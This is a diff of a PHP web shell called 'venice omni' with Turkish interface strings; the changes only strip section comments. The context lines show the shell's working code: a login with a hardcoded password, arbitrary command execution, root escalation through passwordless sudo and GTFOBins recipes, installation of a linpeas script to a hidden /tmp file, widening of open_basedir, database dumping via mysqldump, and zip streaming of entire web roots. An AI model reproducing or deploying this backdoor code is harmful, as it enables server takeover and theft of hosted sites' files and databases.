@@ -19,7 +19,7 @@ define('PASS','venice123');
 define('SELF', __FILE__);
 $SITER = @is_dir('/var/www/vhosts') ? '/var/www/vhosts' : '/var/www';
 
-/* ---------- dil ---------- */
+
 $LANG = (isset($_COOKIE['vl']) && $_COOKIE['vl'] === 'en') ? 1 : 0;
 $DICT = array(
  'up'=>array('yukari','up'), 'dirs'=>array('klasor','dirs'), 'files'=>array('dosya','files'),
@@ -57,7 +57,7 @@ function h($s){ return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8'); }
 function q($s){ return escapeshellarg((string)$s); }
 function fs($n){ $n=(int)$n; if($n>=1073741824) return round($n/1073741824,2).'G'; if($n>=1048576) return round($n/1048576,1).'M'; if($n>=1024) return round($n/1024,1).'K'; return $n.'B'; }
 
-/* ---------- komut ---------- */
+
 function run($cmd,$shell='sh'){
     $cmd = ($shell==='bash'?'bash -c ':'sh -c ').q($cmd).' 2>&1';
     if(fnok('system')){ @ob_start(); @system($cmd); return (string)@ob_get_clean(); }
@@ -74,14 +74,14 @@ function stream_cmd($cmd){
     while(!@feof($hd)){ echo @fread($hd,65536); @flush(); } @pclose($hd); return true;
 }
 
-/* ---------- root ---------- */
+
 function isroot(){ static $r=null; if($r===null) $r=(trim((string)run('id -u'))==='0'); return $r; }
 function sudook(){ static $x=null; if($x===null){ run('sudo -n true'); $x=(trim((string)run('echo $?'))==='0' || trim((string)run('sudo -n true; echo $?'))==='0'); } return $x; }
 function rootrun($cmd){ if(isroot()) return run($cmd); if(sudook()) return run('sudo -n sh -c '.q($cmd)); return run($cmd); }
 function rootwrite($f,$data){ if(isroot()){ @file_put_contents($f,$data); return; } if(sudook()){ run('cat <<\'VZEOF\' | sudo -n tee '.q($f).' >/dev/null'."\n".$data."\nVZEOF"); return; } @file_put_contents($f,$data); }
 function curuser(){ static $u=null; if($u!==null) return $u; $u=trim((string)run('id')); return $u; }
 
-/* ---------- linpeas ---------- */
+
 function lp_exe(){ $p='/tmp/.vz_lp.sh'; return @is_file($p)?$p:''; }
 function lp_install(){
     $p='/tmp/.vz_lp.sh';
@@ -94,7 +94,7 @@ function lp_install(){
     return @is_file($p)?'':'indirilemedi';
 }
 
-/* ---------- okuma / listeleme ---------- */
+
 function grab($f){
     $c=@file_get_contents($f); if($c!==false) return $c;
     if(!fnok('popen') && !fnok('shell_exec') && !fnok('system') && !fnok('exec')) return false;
@@ -110,7 +110,7 @@ function lsraw($d){
     return $o;
 }
 
-/* ---------- zip akışı ---------- */
+
 function dosdt($ts){ $d=@getdate($ts); $y=$d['year']-1980; if($y<0)$y=0; return array((($y<<9)|($d['mon']<<5)|$d['mday']),(($d['hours']<<11)|($d['minutes']<<5)|($d['seconds']>>1))); }
 function zstream($root){
     $root=rtrim(str_replace('\\','/',$root),'/');
@@ -154,7 +154,6 @@ function zstream($root){
        .pack('V',strlen($CD)).pack('V',$OFF).pack('v',0);
 }
 
-/* ---------- parametre ---------- */
 $P=array();
 $rd = isset($_POST['d'])?$_POST['d']:(isset($_GET['d'])?$_GET['d']:'');
 if($rd!==''){ $j=base64_decode($rd,true); if($j!==false){ $t=json_decode($j,true); if(is_array($t)) $P=$t; } }
@@ -162,7 +161,6 @@ foreach($_POST as $k=>$v){ if(!isset($P[$k])) $P[$k]=$v; }
 foreach($_GET as $k=>$v){ if(!isset($P[$k])) $P[$k]=$v; }
 function p($k,$d=''){ global $P; return (isset($P[$k])&&$P[$k]!=='')?$P[$k]:$d; }
 
-/* ---------- oturum ---------- */
 $HASH=md5('omx'.PASS);
 $ok=(isset($_COOKIE['vx'])&&$_COOKIE['vx']===$HASH)||(isset($_GET['k'])&&$_GET['k']===PASS);
 if(isset($_POST['pw'])){ if($_POST['pw']===PASS){ @setcookie('vx',$HASH,time()+2592000,'/'); $ok=true; } else $err=1; }
@@ -170,7 +168,6 @@ if(isset($_GET['out'])){ @setcookie('vx','',time()-3600,'/'); header('Location: 
 if(isset($_GET['l'])){ @setcookie('vl', $_GET['l']==='en'?'en':'tr', time()+2592000, '/'); $LANG = $_GET['l']==='en'?1:0; }
 $SAFE=isset($_COOKIE['vsf'])&&$_COOKIE['vsf']==='1';
 
-/* ---------- ham uçlar (auth sonrası) ---------- */
 $A=p('a','ls');
 $path=str_replace('\\','/',(string)p('p',@getcwd()));
 if($path==='') $path='/';
@@ -200,7 +197,6 @@ if($ok){
     if(isset($_GET['zd'])){ zstream(base64_decode(strtr($_GET['zd'],'-_','+/'))); exit; }
 }
 
-/* ---------- login ---------- */
 if(!$ok){
 ?><!DOCTYPE html><html lang="<?php echo $LANG?'en':'tr'; ?>"><head><meta charset="utf-8"><title>omni</title>
 <style>body{background:#080a0e;color:#c9d1d9;font:14px monospace;display:flex;height:100vh;align-items:center;justify-content:center;margin:0}
@@ -213,19 +209,16 @@ button{padding:9px 14px;background:#1f6feb;border:0;color:#fff;border-radius:4px
 <?php if(!empty($err)) echo '<div class="e">'.t('badlogin').'</div>'; ?></form></body></html>
 <?php exit; }
 
-/* ---------- open_basedir genişletme ---------- */
 $OB=@ini_get('open_basedir');
 if($OB){ @ini_set('open_basedir', $OB.';/;/tmp;/var/www;'.$SITER); }
 
 $WRITE=array('save','del','ren','copy','move','mk','mkfile','up','touch');
 
-/* ================= AKSİYONLAR ================= */
 if(isset($_POST['d'])||$A!=='ls'){
  if($SAFE && in_array($A,$WRITE)){ echo t('locked'); exit; }
 
  switch($A){
 
-/* ---------------- DOSYALAR ---------------- */
 case 'ls': {
     $it=lsraw($path); $dirs=array(); $files=array();
     foreach($it as $e){ $f=$path.$e; if(@is_dir($f)) $dirs[]=$e; else $files[]=$e; }
@@ -324,7 +317,6 @@ case 'tree': {
     echo '<div class="wrap">'.($o?:t('empty')).'</div>'; exit;
 }
 
-/* ---------------- TERMİNAL ---------------- */
 case 'exec': {
     $c=p('c'); $sh=p('sh','sh'); $as=p('as','user');
     if($c===''){ echo t('nocmd'); exit; }
@@ -333,7 +325,6 @@ case 'exec': {
     @chdir($old); exit;
 }
 
-/* ---------------- ROOT ---------------- */
 case 'root': {
     $m=p('m','check');
     if($m==='lpinst'){ echo lp_install()?:t('installed').': '.lp_exe(); exit; }
@@ -400,7 +391,6 @@ case 'root': {
     echo h($o); exit;
 }
 
-/* ---------------- VERİTABANI ---------------- */
 case 'db': {
     $m=p('m','diag');
     $MD=array('/usr/bin/mysqldump','/usr/local/psa/mysql/bin/mysqldump','/usr/local/mysql/bin/mysqldump','/opt/plesk/mysql/bin/mysqldump');
@@ -473,7 +463,6 @@ case 'db': {
     exit;
 }
 
-/* ---------------- SUNUCU ---------------- */
 case 'srv': {
     $m=p('m','info');
     $map=array(
@@ -493,7 +482,6 @@ case 'srv': {
     echo h($o); exit;
 }
 
-/* ---------------- ARAÇLAR ---------------- */
 case 'tool': {
     $m=p('m');
     if($m==='b64d'){ echo h((string)@base64_decode(p('v'))); exit; }
@@ -515,7 +503,6 @@ case 'lang': { @setcookie('vl',p('v')==='en'?'en':'tr',time()+2592000,'/'); echo
 }
 }
 
-/* ---------- GTFOBins ---------- */
 function gtfo_cmd($b){
     $n=basename($b); $B=q($b);
     $m=array(
@@ -555,7 +542,6 @@ function gtfo_cmd($b){
     return isset($m[$n]) ? str_replace('{B}',$B,$m[$n]) : '';
 }
 
-/* ================= ARAYÜZ ================= */
 ?><!DOCTYPE html><html lang="<?php echo $LANG?'en':'tr'; ?>"><head><meta charset="utf-8"><title>venice omni</title>
 <style>
 *{box-sizing:border-box}
